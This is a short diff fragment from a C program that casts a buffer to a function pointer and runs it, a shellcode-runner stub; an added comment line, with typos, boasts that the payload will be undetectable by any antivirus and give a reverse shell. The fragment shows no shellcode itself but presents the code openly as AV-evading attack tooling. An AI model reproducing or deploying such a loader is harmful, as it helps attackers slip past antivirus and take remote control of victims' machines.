@@ -53,3 +53,5 @@ int main (int argc, char **argv)
 	int (*ret)() = (int(*)())buf;
 	ret();
 }
+
+# Now out patload will be undetectable by any AV nad we are able to get reverse shell
